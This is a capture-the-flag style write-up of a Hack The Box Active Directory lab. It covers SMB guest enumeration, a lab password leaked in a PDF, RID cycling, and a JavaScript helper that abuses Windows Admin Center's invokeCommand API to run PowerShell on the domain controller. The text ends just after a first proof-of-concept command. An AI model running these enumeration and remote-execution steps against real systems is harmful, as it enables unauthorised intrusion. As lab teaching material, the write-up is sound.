Welcome to another Hack The Box writeup. This time we're tackling **DanglingTree**, a Windows Active Directory box. Like the DarkZeroReturns breakdown, the goal here isn't just to list the commands that got us to `root.txt` — it's to actually slow down and explain *why* each command was run, what the output meant, and how one small discovery kept opening the door to the next one.

This box in particular is a great teaching example because almost nothing here is a single "smash the front door" vulnerability. Instead it's a long chain of small, realistic misconfigurations — a leaked document, a management console that does exactly what it's supposed to do, a password-reset endpoint that only trusts the network it's bound to, a home-grown encryption scheme with hardcoded keys, and finally a full Active Directory Certificate Services (ADCS) escalation built from scratch. Every one of these individually looks minor. Chained together, they hand over the entire domain.

Let's get started.

## Part I — External Recon and Initial Foothold

### Phase 1: Reconnaissance

As always, we start with a full TCP port scan to see what's actually exposed:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ nmap -Pn -p- -sV -T5 10.129.47.38
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-18 03:49 EDT
Stats: 0:03:35 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 61.98% done; ETC: 03:54 (0:02:13 remaining)
Nmap scan report for DC.danglingtree.htb (10.129.47.38)
Host is up (0.22s latency).
Not shown: 65510 filtered tcp ports (no-response)
PORT      STATE SERVICE               VERSION
53/tcp    open  domain                Simple DNS Plus
80/tcp    open  http                  Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec          Microsoft Windows Kerberos (server time: 2026-09-18 14:54:13Z)
135/tcp   open  msrpc                 Microsoft Windows RPC
139/tcp   open  netbios-ssn           Microsoft Windows netbios-ssn
389/tcp   open  ldap                  Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http              Microsoft IIS httpd 10.0
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http            Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap              Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap                  Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/globalcatLDAPssl?
3389/tcp  open  ms-wbt-server
6600/tcp  open  ssl/mshvlm?
9389/tcp  open  mc-nmf                .NET Message Framing
49664/tcp open  msrpc                 Microsoft Windows RPC
49678/tcp open  msrpc                 Microsoft Windows RPC
49681/tcp open  msrpc                 Microsoft Windows RPC
49682/tcp open  ncacn_http            Microsoft Windows RPC over HTTP 1.0
49683/tcp open  msrpc                 Microsoft Windows RPC
49693/tcp open  msrpc                 Microsoft Windows RPC
49704/tcp open  msrpc                 Microsoft Windows RPC
49717/tcp open  msrpc                 Microsoft Windows RPC
49757/tcp open  msrpc                 Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3389-TCP:V=7.95%I=7%D=9/18%Time=6AACEE5B%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\
SF:0\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port6600-TCP:V=7.95%T=SSL%I=7%D=9/18%Time=6AACEE6A%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,2000,"HTTP/1\.1\x20403\x20Forbidden\r\nConnection:\x20cl
SF:ose\r\nDate:\x20Fri,\x2018\x20Sep\x202026\x2014:54:33\x20GMT\r\nCache-C
SF:ontrol:\x20no-store\r\nCache-Control:\x20max-age=0\r\nPragma:\x20no-cac
SF:he\r\nSet-Cookie:\x20\.AspNetCore\.Antiforgery\.7Eyhia2WOxE=CfDJ8HsozUL
SF:o80ZBsxvkNAKguomYJ5MiCpfON2G4zp1R_VbhRsu0DXmJcpDp6RDvQhjyGAF1JXYs1x5l2c
SF:5ocDe75Cxyl28lAKzEvAB9FxkEHz8ZoWR4_4mHBwh4uybN5jrwrFUorB6ibfRqe3Umk8uCB
SF:Ic;\x20path=/;\x20secure;\x20samesite=none;\x20Partitioned\r\nSet-Cooki
SF:e:\x20WAC-SESSION=4c3d239f9817469483da2090f65301e2;\x20expires=Sat,\x20
SF:19\x20Sep\x202026\x2014:54:33\x20GMT;\x20path=/;\x20secure;\x20samesite
SF:=lax;\x20httponly\r\nSet-Cookie:\x20WAC-TOKEN=;\x20expires=Thu,\x2001\x
SF:20Jan\x201970\x2000:00:00\x20GMT;\x20path=/\r\nSet-Cookie:\x20WAC-AAD=;
SF:\x20expires=Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT;\x20path=/\r\n
SF:Set-Cookie:\x20XSRF-TOKEN=;\x20expires=Thu,\x2001\x20Jan\x201970\x2000:
SF:00:00\x20GMT;\x20path=/\r\nStrict-Transport-Security:\x20max-age=518400
SF:0;\x20includeSubDomains;\x20preload\r\n\r\n<!DOCTYPE\x20html>\r\n<html\
SF:x20lang=\"en\"\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\r\n\r\n<hea
SF:d")%r(HTTPOptions,2000,"HTTP/1\.1\x20403\x20Forbidden\r\nConnection:\x2
SF:0close\r\nDate:\x20Fri,\x2018\x20Sep\x202026\x2014:54:34\x20GMT\r\nCach
SF:e-Control:\x20no-store\r\nCache-Control:\x20max-age=0\r\nPragma:\x20no-
SF:cache\r\nSet-Cookie:\x20\.AspNetCore\.Antiforgery\.7Eyhia2WOxE=CfDJ8Hso
SF:zULo80ZBsxvkNAKguokcvPs6Mwl9iMPDgzVuyh5tnsCIUBBhc0PKOw_Naf1EAB95LZX7ar-
SF:LU6LnKcmH9wiKpjGGhqiEtIcneqgrGB2Wksi2dNVm9o7QyVw9MN2HeJ38b1o79pFyKAq5sq
SF:Kk65s;\x20path=/;\x20secure;\x20samesite=none;\x20Partitioned\r\nSet-Co
SF:okie:\x20WAC-SESSION=5585d67a475d46a49d35fd6b2fccc4e7;\x20expires=Sat,\
SF:x2019\x20Sep\x202026\x2014:54:34\x20GMT;\x20path=/;\x20secure;\x20sames
SF:ite=lax;\x20httponly\r\nSet-Cookie:\x20WAC-TOKEN=;\x20expires=Thu,\x200
SF:1\x20Jan\x201970\x2000:00:00\x20GMT;\x20path=/\r\nSet-Cookie:\x20WAC-AA
SF:D=;\x20expires=Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT;\x20path=/\
SF:r\nSet-Cookie:\x20XSRF-TOKEN=;\x20expires=Thu,\x2001\x20Jan\x201970\x20
SF:00:00:00\x20GMT;\x20path=/\r\nStrict-Transport-Security:\x20max-age=518
SF:4000;\x20includeSubDomains;\x20preload\r\n\r\n<!DOCTYPE\x20html>\r\n<ht
SF:ml\x20lang=\"en\"\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\r\n\r\n<
SF:head");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 482.80 seconds
````

**Reading the results:** this is unmistakably a Windows **Active Directory Domain Controller**. The classic AD fingerprint is all here — Kerberos (`88`), LDAP (`389`), LDAPS (`636`), the Global Catalog ports (`3268`/`3269`), NetBIOS/SMB (`139`/`445`), the `kpasswd` service (`464`, used for self-service password changes), and RPC-over-HTTP (`593`). The hostname is literally `DC`, and the domain is `danglingtree.htb`.

A few details are worth flagging immediately because they'll matter later:

* **Port 80/443** — IIS is serving a website. Worth a look, but on a DC this is very often just a certificate-services web enrollment page or something similarly administrative rather than a "real" application.
* **Port 3389** — Remote Desktop is open. Not directly useful without credentials, but it confirms interactive GUI logons are a possible endgame.
* **Port 9389** — this is `.NET Message Framing`, which on a DC almost always means the **Active Directory Web Services (ADWS)** endpoint — the same channel modern AD PowerShell cmdlets (and tools like BloodHound's newer collectors) use instead of raw LDAP.
* **Port 6600** — this one doesn't fit the standard AD service list at all, and Nmap couldn't confidently name it. Its fingerprint attempt (the giant `SF-Port6600-TCP` block) is actually the most valuable piece of information in the whole scan: buried in that raw fingerprint is an HTTP `403 Forbidden` response carrying cookies named `.AspNetCore.Antiforgery.*`, `WAC-SESSION`, `WAC-TOKEN`, and `WAC-AAD`. Those `WAC` prefixes are the signature of Microsoft's **Windows Admin Center** — a browser-based management console for Windows Server that, notably, is normally installed on a *gateway* machine to manage other servers remotely, not run directly on a random port. Its presence here, reachable straight from the DC, is a huge lead: if we can log into it, we get an officially-sanctioned way to run PowerShell on whatever node it manages.
* **Absent from this scan:** there's no `5985`/`5986` (WinRM) listed. That tells us we shouldn't expect `evil-winrm` to work with plain credentials alone — we're going to need another route in.

We add the target to our hosts file so both the bare IP and the AD-style hostname resolve correctly (important later for Kerberos, which is picky about names matching):

```shell
# /etc/hosts
10.129.47.38    DC.danglingtree.htb danglingtree.htb DC
```

### Phase 2: Anonymous SMB Access and a Leaked Document

Before touching credentials, it's always worth checking whether SMB allows a **null** or **guest** session — many AD environments still leave this enabled by accident (or on purpose, for legacy file shares), and it's essentially free reconnaissance:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ nxc smb DC.danglingtree.htb -u guest -p '' --shares
SMB         10.129.47.38    445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.47.38    445    DC               [+] danglingtree.htb\guest: 
SMB         10.129.47.38    445    DC               [*] Enumerated shares
SMB         10.129.47.38    445    DC               Share           Permissions     Remark
SMB         10.129.47.38    445    DC               -----           -----------     ------
SMB         10.129.47.38    445    DC               ADMIN$                          Remote Admin
SMB         10.129.47.38    445    DC               C$                              Default share
SMB         10.129.47.38    445    DC               IPC$            READ            Remote IPC
SMB         10.129.47.38    445    DC               IT              READ            
SMB         10.129.47.38    445    DC               NETLOGON                        Logon server share 
SMB         10.129.47.38    445    DC               SYSVOL                          Logon server share 
```

`Null Auth:True` in that first line is the tell — the box is happy to authenticate an empty username/password pair and hand back its share listing. Most shares here are the standard defaults, but `IT` stands out immediately: it's a **custom** share, and it's **READ**-able by an unauthenticated guest. That's a mistake worth digging into.

Rather than manually browsing folder by folder, we use NetExec's `spider_plus` module, which crawls every reachable share and inventories every file it finds (name, size, timestamps) without necessarily downloading everything blindly:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ nxc smb DC.danglingtree.htb -u guest -p '' -M spider_plus
SMB         10.129.47.38    445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.47.38    445    DC               [+] danglingtree.htb\guest: 
SPIDER_PLUS 10.129.47.38    445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.47.38    445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.47.38    445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.47.38    445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.47.38    445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.47.38    445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.47.38    445    DC               [*]  OUTPUT_FOLDER: /home/kuroshiro/.nxc/modules/nxc_spider_plus
SMB         10.129.47.38    445    DC               [*] Enumerated shares
SMB         10.129.47.38    445    DC               Share           Permissions     Remark
SMB         10.129.47.38    445    DC               -----           -----------     ------
SMB         10.129.47.38    445    DC               ADMIN$                          Remote Admin
SMB         10.129.47.38    445    DC               C$                              Default share
SMB         10.129.47.38    445    DC               IPC$            READ            Remote IPC
SMB         10.129.47.38    445    DC               IT              READ            
SMB         10.129.47.38    445    DC               NETLOGON                        Logon server share 
SMB         10.129.47.38    445    DC               SYSVOL                          Logon server share 
SPIDER_PLUS 10.129.47.38    445    DC               [+] Saved share-file metadata to "/home/kuroshiro/.nxc/modules/nxc_spider_plus/10.129.47.38.json".
SPIDER_PLUS 10.129.47.38    445    DC               [*] SMB Shares:           6 (ADMIN$, C$, IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.47.38    445    DC               [*] SMB Readable Shares:  2 (IPC$, IT)
SPIDER_PLUS 10.129.47.38    445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.47.38    445    DC               [*] Total folders found:  1
SPIDER_PLUS 10.129.47.38    445    DC               [*] Total files found:    1
SPIDER_PLUS 10.129.47.38    445    DC               [*] File size average:    28.23 KB
```

Only one file turned up, but that's all we need — the crawler drops a JSON inventory we can inspect directly:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ cat /home/kuroshiro/.nxc/modules/nxc_spider_plus/10.129.47.38.json
{
    "IT": {
        "Security/DanglingTree_RoE_Assessment.pdf": {
            "atime_epoch": "2026-04-04 13:05:20",
            "ctime_epoch": "2026-04-04 11:50:23",
            "mtime_epoch": "2026-04-04 21:05:22",
            "size": "28.23 KB"
        }
    }
}                                                                                
```

A **"Rules of Engagement" assessment document**, sitting in an unauthenticated share, is about as juicy as it gets — these documents are written by (or for) internal IT/security teams and very often contain example credentials, scope details, or test accounts that get forgotten and left behind after the fact. Let's grab it using `impacket-smbclient`'s interactive shell:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ impacket-smbclient guest@DC.danglingtree.htb -no-pass                         
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use IT
# cd Security
# ls
drw-rw-rw-          0  Sat Apr  4 21:05:20 2026 .
drw-rw-rw-          0  Sat Apr  4 21:05:08 2026 ..
-rw-rw-rw-      28905  Sat Apr  4 21:05:22 2026 DanglingTree_RoE_Assessment.pdf
# get DanglingTree_RoE_Assessment.pdf
```

Scrolling through the PDF, I've found this credentials

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F95Q2i1GkJtMm5KT6VTtd%252FScreenshot%2520%283411%29.png%3Falt%3Dmedia%26token%3D1d86e696-34c8-4d20-bdd1-eec7c788b506&width=768&dpr=3&quality=100&sign=d81bbe0392f1d239bee860415ee298de&sv=3)

This is exactly the kind of "ohh" moment these engagements rely on: a document meant to formally describe a *previous* penetration test scope apparently still contains a live test account (`anderson.w`) and its password, `R3dT3am@Acc3ss#01` — almost certainly a throwaway account created for that earlier assessment and never removed afterward. Rules-of-Engagement paperwork is written for humans to read, not for a SOC to scan for secrets, so it's a surprisingly common place for stray credentials to survive long after everyone has forgotten about them.

Continue to enumerate the user list and valid shares

However, this user are isolated, giving us no further access accept RID bruting:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ nxc smb danglingtree.htb -u anderson.w -p 'R3dT3am@Acc3ss#01' --rid-brute 3000 
SMB         10.129.47.38    445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.47.38    445    DC               [+] danglingtree.htb\anderson.w:R3dT3am@Acc3ss#01 
SMB         10.129.47.38    445    DC               498: DANGLINGTREE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.47.38    445    DC               500: DANGLINGTREE\Administrator (SidTypeUser)
SMB         10.129.47.38    445    DC               501: DANGLINGTREE\Guest (SidTypeUser)
SMB         10.129.47.38    445    DC               502: DANGLINGTREE\krbtgt (SidTypeUser)
SMB         10.129.47.38    445    DC               512: DANGLINGTREE\Domain Admins (SidTypeGroup)
SMB         10.129.47.38    445    DC               513: DANGLINGTREE\Domain Users (SidTypeGroup)
SMB         10.129.47.38    445    DC               514: DANGLINGTREE\Domain Guests (SidTypeGroup)
SMB         10.129.47.38    445    DC               515: DANGLINGTREE\Domain Computers (SidTypeGroup)
SMB         10.129.47.38    445    DC               516: DANGLINGTREE\Domain Controllers (SidTypeGroup)
SMB         10.129.47.38    445    DC               517: DANGLINGTREE\Cert Publishers (SidTypeAlias)
SMB         10.129.47.38    445    DC               518: DANGLINGTREE\Schema Admins (SidTypeGroup)
SMB         10.129.47.38    445    DC               519: DANGLINGTREE\Enterprise Admins (SidTypeGroup)
SMB         10.129.47.38    445    DC               520: DANGLINGTREE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.47.38    445    DC               521: DANGLINGTREE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.47.38    445    DC               522: DANGLINGTREE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.47.38    445    DC               525: DANGLINGTREE\Protected Users (SidTypeGroup)
SMB         10.129.47.38    445    DC               526: DANGLINGTREE\Key Admins (SidTypeGroup)
SMB         10.129.47.38    445    DC               527: DANGLINGTREE\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.47.38    445    DC               528: DANGLINGTREE\Forest Trust Accounts (SidTypeGroup)
SMB         10.129.47.38    445    DC               529: DANGLINGTREE\External Trust Accounts (SidTypeGroup)
SMB         10.129.47.38    445    DC               553: DANGLINGTREE\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.47.38    445    DC               571: DANGLINGTREE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.47.38    445    DC               572: DANGLINGTREE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.47.38    445    DC               1000: DANGLINGTREE\DC$ (SidTypeUser)
SMB         10.129.47.38    445    DC               1101: DANGLINGTREE\DnsAdmins (SidTypeAlias)
SMB         10.129.47.38    445    DC               1102: DANGLINGTREE\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.47.38    445    DC               1103: DANGLINGTREE\jake.h (SidTypeUser)
SMB         10.129.47.38    445    DC               1105: DANGLINGTREE\Cert_Managers (SidTypeGroup)
SMB         10.129.47.38    445    DC               1106: DANGLINGTREE\Helpdesk_Cert_Support (SidTypeGroup)
SMB         10.129.47.38    445    DC               1107: DANGLINGTREE\Template_Editors (SidTypeGroup)
SMB         10.129.47.38    445    DC               1108: DANGLINGTREE\DevOps_PKI (SidTypeGroup)
SMB         10.129.47.38    445    DC               1109: DANGLINGTREE\Windows Admin Center CredSSP (SidTypeAlias)
SMB         10.129.47.38    445    DC               1110: DANGLINGTREE\svc_mail (SidTypeUser)
SMB         10.129.47.38    445    DC               1602: DANGLINGTREE\noah.b (SidTypeUser)
SMB         10.129.47.38    445    DC               1603: DANGLINGTREE\support-it (SidTypeGroup)
SMB         10.129.47.38    445    DC               1604: DANGLINGTREE\alex.o (SidTypeUser)
SMB         10.129.47.38    445    DC               2601: DANGLINGTREE\anderson.w (SidTypeUser)
```

### Phase 3: RID Cycling — Enumerating a Domain You Can't Directly Read

Before moving on, it's worth explaining exactly what just happened, because **RID brute forcing (RID cycling)** is one of those techniques that feels almost like a bug the first time you see it work. Every security principal in a Windows domain — every user, group, and computer — has a **SID** (Security Identifier) made up of a domain-wide prefix plus a final number called the **RID** (Relative Identifier). Built-in accounts always land on predictable RIDs (`500` = Administrator, `501` = Guest, `502` = `krbtgt`, and so on), while everything created afterward — real users, custom groups — just gets the next RID in sequence.

The trick: the SMB/LSA call that translates a RID into an account name (`LsaLookupSids` under the hood) only requires **any authenticated session**, not any particular level of directory read access. So even though `anderson.w` turned out to be a dead-end, isolated account with no useful group memberships and no ability to browse the directory normally, `nxc --rid-brute` can still walk RIDs `0` through `3000` one at a time and ask the DC "whose SID is domain-SID-plus-this-number?" — and the DC happily answers every single time, regardless of what `anderson.w` is actually allowed to do. This is exactly why RID cycling remains useful even against a "locked down" low-privilege account: it turns a single working login of *any* kind into a full user, group, and computer directory listing.

The results here are a goldmine of forward-looking hints, even before we understand how any of it connects yet:

* Real human accounts: `jake.h`, `noah.b`, `alex.o`, `anderson.w`, plus a service account `svc_mail`.
* A cluster of unmistakably **certificate-related** custom groups: `Cert_Managers`, `Helpdesk_Cert_Support`, `Template_Editors`, `DevOps_PKI`. Groups with names like these almost always exist because **Active Directory Certificate Services (ADCS)** is deployed on this domain, and someone has carved out delegated permissions for managing certificate templates and the CA itself. That's a strong signal we'll be doing ADCS abuse later.
* `Windows Admin Center CredSSP` — direct confirmation that the mysterious port `6600` really is Windows Admin Center, and that it's configured to use CredSSP-based delegation (letting the WAC gateway pass credentials through to the servers it manages).

Direct confirmation that `anderson.w`'s credentials also work against LDAP:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ nxc ldap DC.danglingtree.htb -u anderson.w -p 'R3dT3am@Acc3ss#01'
LDAP        10.129.47.38    389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:danglingtree.htb) (signing:Enforced) (channel binding:Never) 
LDAP        10.129.47.38    389    DC               [+] danglingtree.htb\anderson.w:R3dT3am@Acc3ss#01
```

Next, we check the **MachineAccountQuota (MAQ)** — an attribute on the domain object that controls how many *new computer accounts* an ordinary authenticated user is allowed to join to the domain (10 by default in most environments):

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ nxc ldap DC.danglingtree.htb -u anderson.w -p 'R3dT3am@Acc3ss#01' -M maq
LDAP        10.129.47.38    389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:danglingtree.htb) (signing:Enforced) (channel binding:Never) 
LDAP        10.129.47.38    389    DC               [+] danglingtree.htb\anderson.w:R3dT3am@Acc3ss#01 
MAQ         10.129.47.38    389    DC               [*] Getting the MachineAccountQuota
MAQ         10.129.47.38    389    DC               MachineAccountQuota: 0
```

**Why this matters:** `MachineAccountQuota: 0` means this domain has been explicitly hardened against a whole family of attacks that rely on registering a rogue computer account — things like relaying authentication into a newly created machine account, or setting up **Resource-Based Constrained Delegation (RBCD)** by pointing a fake computer object's delegation rights at a target. Ruling that path out early saves a lot of wasted effort later; it tells us the domain owners specifically anticipated and closed off that avenue, so we should look elsewhere.

Finally, a direct LDAP user listing confirms `anderson.w` really can't see much of the directory — this account is deliberately siloed:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ nxc ldap DC.danglingtree.htb -u anderson.w -p 'R3dT3am@Acc3ss#01' --users
LDAP        10.129.47.38    389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:danglingtree.htb) (signing:Enforced) (channel binding:Never) 
LDAP        10.129.47.38    389    DC               [+] danglingtree.htb\anderson.w:R3dT3am@Acc3ss#01 
LDAP        10.129.47.38    389    DC               [*] Enumerated 1 domain users: danglingtree.htb
LDAP        10.129.47.38    389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.47.38    389    DC               anderson.w                    2026-04-04 20:00:40 0 
```

Only `anderson.w` herself comes back — a normal `--users` LDAP query respects standard directory read permissions (unlike RID cycling, which bypasses them), and this account simply isn't allowed to browse other objects. RID cycling really was the only reason we got that full user/group list a moment ago.

### Phase 4: Windows Admin Center — Turning a Login Into Code Execution

So I enumerated to my Nmap Scan and I noticed the port `6600`, let's visit:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FpXU1uHcnSfm1D9aTZQ3V%252FScreenshot%2520%283410%29.png%3Falt%3Dmedia%26token%3D55237a3c-d8f5-4bb7-9d37-0a97728021df&width=768&dpr=3&quality=100&sign=ebd053106f564690f76f11ef67f6473c&sv=3)

This confirms what the Nmap fingerprint hinted at: it's a **Windows Admin Center** login screen. WAC is Microsoft's modern replacement for a lot of the old MMC-snap-in style remote server management — it runs as a web *gateway*, and once you authenticate, it lets you manage one or more registered Windows "nodes" (servers) directly from the browser: services, event logs, storage, and — critically for us — a built-in **PowerShell console** that executes directly on the managed node.

I tried to use the credentials we've found in the PDF and it worked!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FI6xPi4PTwtcdTRRXj5xm%252FScreenshot%2520%283412%29.png%3Falt%3Dmedia%26token%3D419111b1-ef2d-491b-a36b-29307ee07da2&width=768&dpr=3&quality=100&sign=1b5ed45771aed50844bb4f7fcd647b2f&sv=3)

Here's the part that's easy to gloss over but is actually the whole point of this phase: **this isn't a vulnerability yet — it's a feature working exactly as designed.** Windows Admin Center's entire purpose is to let an authorized administrator run PowerShell against a server from a browser. The instant `anderson.w`'s leaked credentials got us logged into WAC, we effectively already had a legitimate, sanctioned path to remote code execution on whatever node WAC manages — we just hadn't found the exact API call yet. That's the "ohh, I didn't realize that" moment worth sitting with: a management console is, by definition, a code-execution primitive for anyone who can log into it. The rest of this phase is just about reaching that primitive directly through the API instead of clicking through the GUI.

Continuin to enumerate, the version of this Admin Center is `2511` , researching if there's a know vuln and here's what I've found out CVE-2026-26119 Improper authentication in Windows Admin Center allows an authorized attacker to elevate privileges over a network.

There is article explaining the detail of this [CVE](https://www.semperis.com/blog/what-you-need-to-know-windows-admin-center-remote-privilege-escalation-cve-2026-26119/) Although the version on the target machine has been fixed, it teaches us how to use the `invokeCommand` API as the current user context.

Worth being precise here: CVE-2026-26119 itself is a **privilege-escalation** bug — it's about a normal WAC session being able to trick the gateway into trusting the *gateway's own computer account* rather than the logged-in user, effectively borrowing far more powerful permissions than the logged-in account should have. This target has already been patched against that specific escalation trick. But the research behind the CVE is still enormously useful to us, because it documents, in detail, the exact internal API (`invokeCommand`) that WAC's browser front-end uses to actually run PowerShell on a node. We don't need the privilege-escalation bug at all — `anderson.w` already has enough rights through the normal, patched, working version of this API to run commands as herself. We're simply using the documented mechanism directly instead of through the UI.

The target system identifies the data center (dc) as its gateway and exposes PowerShell-based management scripts through this interface. Therefore, the identity trusted by this gateway constitutes a critical security perimeter.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FZROMVgciMZpvYG9ozFn8%252FScreenshot%2520%283413%29.png%3Falt%3Dmedia%26token%3D40c865a8-91da-4b5b-adbc-437560fbc8d8&width=768&dpr=3&quality=100&sign=418ec3d8edec9acf9f826f21049904a0&sv=3)

The PowerShell endpoint is the final execution primitive, not the vulnerability itself. A normal WAC session will run commands as its authenticated user; the vulnerable chain of calls causes WAC to instead trust the gateway's computer account.

The WAC application itself actually provides an RCE entry point directly. The path is as follows:

```
/api/services/WinREST/PowerShell/nodes/<node>/invokeCommand
```

The application stores its authentication state in a WAC-SESSION, and each request requires a matching XSRF-TOKEN.

That XSRF-TOKEN requirement is worth pausing on, because it's a standard **CSRF (Cross-Site Request Forgery) double-submit cookie** defense, and it's exactly why we can't just replay this request blind from `curl` with stolen cookies — we have to be *inside* an authenticated browser session (or otherwise able to read that cookie) to construct a valid request. ASP.NET Core's built-in anti-forgery system sets a token both as a cookie and expects it echoed back as a request header; if an attacker's page tries to forge this request from a different origin, it can read neither the real session cookie nor the matching CSRF token, so the request gets rejected. Here, because we're driving this from the browser's own developer console (already logged in as `anderson.w`), we already have first-party access to both — so this "protection" doesn't stop us at all, it's simply an extra header we need to remember to include.

The request also required the shell module name and version. These are component values, not the Windows Admin Center product build, and the authenticated runtime exposes them directly.

We can retrieve these via JavaScript.

```javascript
({ name: MsftSme.self().Environment.name, version: MsftSme.self().Environment.version });  

Object { name: "msft.sme.shell", version: "6.8.9" }
```

We defined a helper that reuses authenticated cookies and provides these module headers to the browser console:

```javascript
async function invokeWac(script) {
    const match = document.cookie.match(/(?:^|; )XSRF-TOKEN=([^;]+)/);
    if (!match) throw new Error("XSRF-TOKEN was not present");

    const response = await fetch(
        "/api/services/WinREST/PowerShell/nodes/dc/invokeCommand",
        {
            method: "POST",
            credentials: "same-origin",
            headers: {
                "Content-Type": "application/json; charset=UTF-8",
                "X-Xsrf-Token": decodeURIComponent(match[1]),
                "X-Ms-Sme-Module-Name": "msft.sme.shell",
                "X-Ms-Sme-Module-Version": "6.8.9"
            },
            body: JSON.stringify({
                properties: {
                    script,
                    command: "Get-WACSMServerConnectionStatus",
                    module: "Microsoft.SME.ServerManager",
                    state: "ready",
                    useInProcRunspace: false,
                    invokeMode: "Polling"
                }
            })
        }
    );

    const result = await response.json();
    if (!response.ok) throw new Error(JSON.stringify(result));
    return result;
}
```

This function is nothing more than a faithful re-implementation of what the WAC web app itself does every time you click a button in its PowerShell pane — we're just calling it ourselves, on demand, with whatever `script` we want instead of whatever WAC's own UI would have sent. `useInProcRunspace: false` and `invokeMode: "Polling"` tell the gateway to spin up (or reuse) a real out-of-process PowerShell runspace on the node and let us poll for results, exactly like an interactive session would.

Now let's trigger it

```javascript
const poc = await invokeWac("whoami; (Get-Location).Path"); ({ completed: poc.completed, results: poc.results, errors: poc.errors, statusCode: poc.statusCode });  

Object { completed: "True", results: (2) […], errors: null, statusCode: 0 }

completed: "True"

errors: null

